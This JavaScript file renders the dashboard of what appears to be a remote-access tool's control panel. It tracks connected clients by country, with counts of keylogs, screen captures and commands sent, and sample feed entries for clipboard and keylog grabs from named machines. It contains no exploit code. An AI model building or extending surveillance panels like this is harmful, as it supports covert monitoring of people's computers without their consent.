export function renderDashboard(data) {
    const a = data.analytics;
    const total = Math.max(a.total, 1);
    const onlinePct = Math.round((a.online / total) * 100);
    const offlinePct = Math.round((a.offline / total) * 100);
    const idlePct = 100 - onlinePct - offlinePct;
    const cards = [
        { label: "Total Clients", value: a.total, delta: `+${a.newToday} today`, icon: "👥", tone: "" },
        { label: "Online", value: a.online, delta: `${onlinePct}%`, icon: "🟢", tone: "ok" },
        { label: "Offline", value: a.offline, delta: `${offlinePct}%`, icon: "🔴", tone: "warn" },
        { label: "Idle", value: a.idle, delta: `${idlePct}%`, icon: "🟡", tone: "idle" },
        { label: "Countries", value: a.countries, delta: "worldwide", icon: "🌍", tone: "" },
        { label: "Commands Sent", value: a.commandsSent, delta: "last 24h", icon: "⚡", tone: "" },
        { label: "Screens Captured", value: a.screensCaptured, delta: "last 24h", icon: "📸", tone: "" },
        { label: "Keylogs", value: a.keylogs, delta: "buffered", icon: "⌨️", tone: "" },
        { label: "Bandwidth", value: a.bandwidth, delta: "total", icon: "📡", tone: "" },
        { label: "Avg Uptime", value: a.avgUptime, delta: "per client", icon: "⏱️", tone: "" },
        { label: "Threats", value: a.threats, delta: "detected", icon: "🛡️", tone: a.threats > 0 ? "warn" : "ok" },
        { label: "Active Sessions", value: 1, delta: "admin panel", icon: "🔑", tone: "" },
    ]
        .map((c) => `
        <div class="card stat-card">
          <div class="stat-icon">${c.icon}</div>
          <div class="label">${c.label}</div>
          <div class="value">${c.value}</div>
          <div class="delta ${c.tone}">${c.delta}</div>
        </div>`)
        .join("");
    // Fleet bar
    const barSegments = [
        { cls: "bar-online", pct: onlinePct, label: `Online ${a.online}` },
        { cls: "bar-idle", pct: idlePct, label: `Idle ${a.idle}` },
        { cls: "bar-offline", pct: offlinePct, label: `Offline ${a.offline}` },
    ];
    // Threat alerts
    const threats = [
        { level: "high", msg: "Suspicious process cryptominer.exe on PC-GAMING", time: "28m ago" },
        { level: "medium", msg: "Unusual outbound traffic from SERVER-PROD (port 4444)", time: "1h ago" },
        { level: "low", msg: "Failed login attempt on LAPTOP-ADMIN (3 tries)", time: "2h ago" },
    ];
    const threatRows = threats
        .map((t) => `
      <div class="threat-row threat-${t.level}">
        <span class="threat-badge">${t.level.toUpperCase()}</span>
        <span>${t.msg}</span>
        <span class="muted">${t.time}</span>
      </div>`)
        .join("");
    // Activity timeline
    const activity = [
        { icon: "🟢", msg: `Client HC-9F21A came online`, time: "just now" },
        { icon: "📸", msg: "Screenshot captured from DESKTOP-JAY", time: "2m ago" },
        { icon: "⌨️", msg: "Keylog buffer synced from LAPTOP-ADMIN", time: "5m ago" },
        { icon: "📋", msg: "Clipboard captured from SERVER-PROD", time: "8m ago" },
        { icon: "📁", msg: "File listing requested: C:\\Users\\jay", time: "12m ago" },
        { icon: "🔑", msg: "Panel login from 127.0.0.1", time: "15m ago" },
        { icon: "🔴", msg: "Client HC-88FA4 went offline", time: "3h ago" },
        { icon: "🟡", msg: "Client HC-CC291 entered idle state", time: "28m ago" },
    ]
        .map((a) => `<div class="activity-row"><span class="activity-icon">${a.icon}</span><span>${a.msg}</span><span class="muted">${a.time}</span></div>`)
        .join("");
    // Uptime chart (fake sparkline)
    const hours = Array.from({ length: 24 }, (_, i) => {
        const h = (i + 1).toString().padStart(2, "0");
        const val = Math.floor(60 + Math.random() * 40);
        return { h, val };
    });
    const chartBars = hours
        .map((h) => `<div class="chart-bar" style="height:${h.val}%" title="${h.h}:00 — ${h.val}% uptime"></div>`)
        .join("");
    // Country breakdown
    const countryMap = {};
    data.clients.forEach((c) => {
        countryMap[c.country] = (countryMap[c.country] || 0) + 1;
    });
    const countryRows = Object.entries(countryMap)
        .map(([country, count]) => `<div class="summary-row"><span>${country}</span><span>${count} client${count > 1 ? "s" : ""}</span></div>`)
        .join("");
    // Group breakdown
    const groupMap = {};
    data.clients.forEach((c) => {
        groupMap[c.group] = (groupMap[c.group] || 0) + 1;
    });
    const groupRows = Object.entries(groupMap)
        .map(([group, count]) => `<div class="summary-row"><span>${group}</span><span>${count}</span></div>`)
        .join("");
    return `
    <h1>Dashboard</h1>
    <p class="page-sub">Live analytics across all connected clients.</p>
    <div class="grid grid-4">${cards}</div>

    <div class="two-col">
      <div>
        <h2>Fleet Status</h2>
        <div class="card">
          <div class="bar">
            ${barSegments.map((s) => `<div class="${s.cls}" style="width:${s.pct}%"></div>`).join("")}
          </div>
          <div class="legend">
            <span><i class="dot-online"></i> Online ${a.online}</span>
            <span><i class="dot-idle"></i> Idle ${a.idle}</span>
            <span><i class="dot-offline"></i> Offline ${a.offline}</span>
          </div>
        </div>

        <h2>Uptime (24h)</h2>
        <div class="card">
          <div class="chart">${chartBars}</div>
          <div class="chart-labels">
            <span>00:00</span><span>06:00</span><span>12:00</span><span>18:00</span><span>Now</span>
          </div>
        </div>

        <h2>Threat Alerts</h2>
        <div class="card">${threatRows}</div>
      </div>

      <div>
        <h2>Recent Activity</h2>
        <div class="card activity-feed">${activity}</div>

        <h2>Clients by Country</h2>
        <div class="card">${countryRows}</div>

        <h2>Clients by Group</h2>
        <div class="card">${groupRows}</div>
      </div>
    </div>
  `;
}
